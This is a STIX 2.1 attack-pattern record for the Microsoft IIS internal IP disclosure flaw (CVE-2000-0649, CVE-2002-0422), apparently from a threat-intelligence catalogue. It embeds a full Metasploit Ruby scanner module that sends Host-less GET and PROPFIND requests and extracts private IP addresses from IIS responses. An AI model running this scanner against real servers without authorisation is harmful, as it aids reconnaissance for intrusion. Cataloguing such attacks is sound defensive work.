{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85861d1f-87a8-4168-87d0-f4f4c23df131",
    "created": "2024-08-14T16:28:54.743989Z",
    "modified": "2024-08-14T16:28:54.743993Z",
    "name": "Microsoft IIS HTTP Internal IP Disclosure",
    "description": " Collect any leaked internal IPs by requesting commonly redirected locations from IIS.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/iis_internal_ip.rb",
            "external_id": "iis_internal_ip.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0649"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-0422"
        },
        {
            "source_name": "reference",
            "url": "https://techcommunity.microsoft.com/t5/iis-support-blog/iis-web-servers-running-in-windows-azure-may-reveal-their/ba-p/826500"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft IIS HTTP Internal IP Disclosure',\n        'Description' => %q{\n          Collect any leaked internal IPs by requesting commonly redirected locations from IIS.\n          CVE-2000-0649 references IIS 5.1 (win2k, XP) and older.  However, in newer servers\n          such as IIS 7+, this occurs when the alternateHostName is not set or misconfigured. Also\n          collects internal IPs leaked from the PROPFIND method in certain IIS versions.\n        },\n        'Author' => [\n          'Heather Pilkington',\n          'Matthew Dunn - k0pak4'\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2000-0649'],\n          ['CVE', '2002-0422'],\n          ['BID', '1499'],\n          ['EDB', '20096'],\n          ['URL', 'https://support.microsoft.com/en-us/help/218180/internet-information-server-returns-ip-address-in-http-header-content'], # iis 4,5,5.1\n          ['URL', 'https://support.microsoft.com/en-us/topic/fix-the-internal-ip-address-of-an-iis-7-0-server-is-revealed-if-an-http-request-that-does-not-have-a-host-header-or-has-a-null-host-header-is-sent-to-the-server-c493e9bc-dfd3-0d9b-941c-b2d93a957d9e'], # iis 7+\n          ['URL', 'https://techcommunity.microsoft.com/t5/iis-support-blog/iis-web-servers-running-in-windows-azure-may-reveal-their/ba-p/826500']\n        ]\n      )\n    )\n  end\n\n  def run_host(target_host)\n    uris = ['/', '/images', '/default.htm']\n    methods = ['GET', 'PROPFIND']\n\n    uris.each do |uri|\n      # Must use send_recv() in order to send a HTTP request without the 'Host' header\n      vhost_status = datastore['VHOST'].blank? ? '' : \" against #{vhost}\"\n      vprint_status(\"#{peer} - Requesting #{uri}#{vhost_status}\")\n\n      methods.each do |method|\n        c = connect\n        request = c.request_cgi(\n          'uri' => uri,\n          'method' => method,\n          'headers' => { 'Host' => '' }\n        )\n        res = c.send_recv(request, 25)\n        intipregex = /(192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})/i\n\n        if res.nil?\n          print_error(\"no response for #{target_host}\")\n        elsif ((res.code > 300) && (res.code < 310))\n          vprint_good(\"Location Header: #{res.headers['Location']}\")\n          result = res.headers['Location'].scan(intipregex).uniq.flatten\n\n          if !result.empty?\n            print_good(\"Result for #{target_host}#{uri} with method #{method}. Found Internal IP: #{result.first}\")\n          end\n        elsif res.code == 405\n          result = res.body.scan(intipregex).uniq.flatten\n          if !result.empty?\n            print_good(\"Result for #{target_host}#{uri} with method #{method}. Found Internal IP: #{result.first}\")\n          end\n        end\n\n        next if result.nil?\n\n        report_note({\n          host: target_host,\n          port: rport,\n          proto: 'tcp',\n          sname: (ssl ? 'https' : 'http'),\n          type: 'iis.ip',\n          data: result.first\n        })\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}